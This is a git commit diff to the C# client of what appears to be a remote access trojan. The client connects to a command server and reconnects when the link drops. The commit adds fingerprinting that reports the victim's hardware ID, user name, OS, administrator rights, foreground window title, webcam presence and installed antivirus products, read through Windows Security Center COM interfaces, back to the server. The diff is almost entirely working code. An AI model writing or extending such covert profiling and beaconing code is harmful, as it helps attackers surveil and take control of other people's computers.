066044b47a856e1dd5f3c244bd44b491590e8b52
qwqdanchun <287182701@qq.com>
2022-01-01 01:35:22 +0800

    Update Client getinfo

--- Client/Program.cs
+++ Client/Program.cs
@@ -2,21 +2,20 @@
 using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.Devices;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Runtime.InteropServices.ComTypes;
+using System.Security.Cryptography;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace Client
 {
-    class Settings
-    {
-        public static readonly string IP = "127.0.0.1";
-        public static readonly int Port = 8848;
-        public static readonly string Version = "0.0.1";
-    }
-
     class Program
     {
         public static Socket Client { get; set; }
@@ -27,6 +26,13 @@ namespace Client
         private static MemoryStream MS { get; set; }
         private static object SendSync { get; set; }
 
+
+        #region Setting
+        public static readonly string IP = "127.0.0.1";
+        public static readonly int Port = 8848;
+        public static readonly string Version = "0.0.1";
+        #endregion
+
         static void Main(string[] args)
         {
             InitializeClient();
@@ -36,6 +42,7 @@ namespace Client
             }
         }
 
+        #region Socket
         public static void InitializeClient()
         {
             try
@@ -47,7 +54,7 @@ namespace Client
                     ReceiveTimeout = -1,
                     SendTimeout = -1,
                 };
-                Client.Connect(Settings.IP, Settings.Port);
+                Client.Connect(IP, Port);
                 Debug.WriteLine("Connected!");
                 Buffer = new byte[1];
                 Buffersize = 0;
@@ -66,6 +73,245 @@ namespace Client
                 Reconnect();
             }
         }
+
+        public static byte[] SendInfo()
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
+            msgpack.ForcePathObject("HWID").AsString = HWID();
+            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
+            msgpack.ForcePathObject("Camera").AsString = havecamera().ToString();
+            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
+            msgpack.ForcePathObject("Version").AsString = "0.0.1";
+            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
+            msgpack.ForcePathObject("Active").AsString = GetActiveWindowTitle();
+            msgpack.ForcePathObject("AV").AsString = GetAV();
+            msgpack.ForcePathObject("Install").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
+            msgpack.ForcePathObject("Group").AsString = "Default";
+            return msgpack.Encode2Bytes();
+        }
+
+        #region Info
+
+        #region Active
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        public static string GetActiveWindowTitle()
+        {
+            try
+            {
+                const int nChars = 256;
+                StringBuilder buff = new StringBuilder(nChars);
+                IntPtr handle = GetForegroundWindow();
+                if (GetWindowText(handle, buff, nChars) > 0)
+                {
+                    return buff.ToString();
+                }
+            }
+            catch { }
+            return "";
+        }
+        #endregion
+
+        #region HWID
+        public static string HWID()
+        {
+            try
+            {
+                string strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
+                    Environment.MachineName, Environment.OSVersion
+                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
+                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
+                byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
+                bytesToHash = md5Obj.ComputeHash(bytesToHash);
+                StringBuilder strResult = new StringBuilder();
+                foreach (byte b in bytesToHash)
+                    strResult.Append(b.ToString("x2"));
+                return strResult.ToString().Substring(0, 20).ToUpper();
+            }
+            catch
+            {
+                return "Err HWID";
+            }
+        }
+        #endregion
+
+        #region AV
+        public static string GetAV()
+        {
+            string AV = "";
+            IWSCProductList pWSCProductList;
+            Type WSCProductListType = Type.GetTypeFromCLSID(new Guid("17072F7B-9ABE-4A74-A261-1EB76B55107A"), true);
+            object WSCProductList = Activator.CreateInstance(WSCProductListType);
+            pWSCProductList = (IWSCProductList)WSCProductList;
+
+            if (0 == pWSCProductList.Initialize((uint)0x4))
+            {
+                uint nProductCount = 0;
+                if (0 == pWSCProductList.get_Count(out nProductCount))
+                {
+                    for (uint i = 0; i < nProductCount; i++)
+                    {
+                        IWscProduct pWscProduct;
+                        if (0 == pWSCProductList.get_Item(i, out pWscProduct))
+                        {
+                            string sProductName = new string('\0', 260);
+
+                            if (0 == pWscProduct.get_ProductName(out sProductName))
+                            {
+                                if (AV != "")
+                                {
+                                    AV += " ; ";
+                                }
+                                AV += sProductName;
+                            }
+                            Marshal.ReleaseComObject(pWscProduct);
+                        }
+                    }
+                }
+                Marshal.ReleaseComObject(pWSCProductList);
+            }
+            return AV;
+        }
+
+
+        [ComImport]
+        [Guid("8C38232E-3A45-4A27-92B0-1A16A975F669")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface IWscProduct
+        {
+            #region <IDispatch>
+            int GetTypeInfoCount();
+            [return: MarshalAs(UnmanagedType.Interface)]
+            IntPtr GetTypeInfo([In, MarshalAs(UnmanagedType.U4)] int iTInfo, [In, MarshalAs(UnmanagedType.U4)] int lcid);
+            [PreserveSig]
+            int GetIDsOfNames([In] ref Guid riid, [In, MarshalAs(UnmanagedType.LPArray)] string[] rgszNames, [In, MarshalAs(UnmanagedType.U4)] int cNames,
+                [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
+            [PreserveSig]
+            int Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
+                [Out, In] System.Runtime.InteropServices.DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] System.Runtime.InteropServices.EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
+            #endregion
+
+            int get_ProductName(out string pVal);
+        }
+
+        [ComImport]
+        [Guid("722A338C-6E8E-4E72-AC27-1417FB0C81C2")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface IWSCProductList
+        {
+            #region <IDispatch>
+            int GetTypeInfoCount();
+            [return: MarshalAs(UnmanagedType.Interface)]
+            IntPtr GetTypeInfo([In, MarshalAs(UnmanagedType.U4)] int iTInfo, [In, MarshalAs(UnmanagedType.U4)] int lcid);
+            [PreserveSig]
+            int GetIDsOfNames([In] ref Guid riid, [In, MarshalAs(UnmanagedType.LPArray)] string[] rgszNames, [In, MarshalAs(UnmanagedType.U4)] int cNames,
+                [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
+            [PreserveSig]
+            int Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
+                [Out, In] System.Runtime.InteropServices.DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] System.Runtime.InteropServices.EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
+            #endregion
+
+            int Initialize(uint provider);
+            int get_Count(out uint pVal);
+            int get_Item(uint index, out IWscProduct pVal);
+        }
+        #endregion
+
+        #region Camera
+        public static bool havecamera()
+        {
+            string[] devices = FindDevices();
+            if (devices.Length == 0)
+            {
+                return false;
+            }
+            else
+            {
+                return true;
+            }
+        }
+
+        public static readonly Guid CLSID_VideoInputDeviceCategory = new Guid("{860BB310-5D01-11d0-BD3B-00A0C911CE86}");
+        public static readonly Guid CLSID_SystemDeviceEnum = new Guid("{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}");
+        public static readonly Guid IID_IPropertyBag = new Guid("{55272A00-42CB-11CE-8135-00AA004BB851}");
+        public static string[] FindDevices()
+        {
+            return GetFiltes(CLSID_VideoInputDeviceCategory).ToArray();
+        }
+
+        public static List<string> GetFiltes(Guid category)
+        {
+            var result = new List<string>();
+            EnumMonikers(category, (moniker, prop) =>
+            {
+                object value = null;
+                prop.Read("FriendlyName", ref value, 0);
+                var name = (string)value;
+                result.Add(name);
+                return false;
+            });
+
+            return result;
+        }
+
+
+        private static void EnumMonikers(Guid category, Func<IMoniker, IPropertyBag, bool> func)
+        {
+            IEnumMoniker enumerator = null;
+            ICreateDevEnum device = null;
+
+            try
+            {
+                device = (ICreateDevEnum)Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SystemDeviceEnum));
+                device.CreateClassEnumerator(ref category, ref enumerator, 0);
+                if (enumerator == null) return;
+                var monikers = new IMoniker[1];
+                var fetched = IntPtr.Zero;
+
+                while (enumerator.Next(monikers.Length, monikers, fetched) == 0)
+                {
+                    var moniker = monikers[0];
+                    object value = null;
+                    Guid guid = IID_IPropertyBag;
+                    moniker.BindToStorage(null, null, ref guid, out value);
+                    var prop = (IPropertyBag)value;
+                    try
+                    {
+                        var rc = func(moniker, prop);
+                        if (rc == true) break;
+                    }
+                    finally
+                    {
+                        Marshal.ReleaseComObject(prop);
+                        if (moniker != null) Marshal.ReleaseComObject(moniker);
+                    }
+                }
+            }
+            finally
+            {
+                if (enumerator != null) Marshal.ReleaseComObject(enumerator);
+                if (device != null) Marshal.ReleaseComObject(device);
+            }
+        }
+        [ComVisible(true), ComImport(), Guid("29840822-5B84-11D0-BD3B-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface ICreateDevEnum
+        {
+            int CreateClassEnumerator([In] ref Guid pType, [In, Out] ref IEnumMoniker ppEnumMoniker, [In] int dwFlags);
+        }
+
+        [ComVisible(true), ComImport(), Guid("55272A00-42CB-11CE-8135-00AA004BB851"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface IPropertyBag
+        {
+            int Read([MarshalAs(UnmanagedType.LPWStr)] string PropName, ref object Var, int ErrorLog);
+            int Write(string PropName, ref object Var);
+        }
+        #endregion
+
+        #endregion
 
         public static void Reconnect()
         {
@@ -88,14 +334,6 @@ namespace Client
             InitializeClient();
         }
 
-        public static byte[] SendInfo()
-        {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
-            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString();
-            return msgpack.Encode2Bytes();
-        }
 
         public static void ReadServertData(IAsyncResult ar)
         {
@@ -229,5 +467,7 @@ namespace Client
                 Reconnect();
             }
         }
+
+        #endregion        
     }
 }
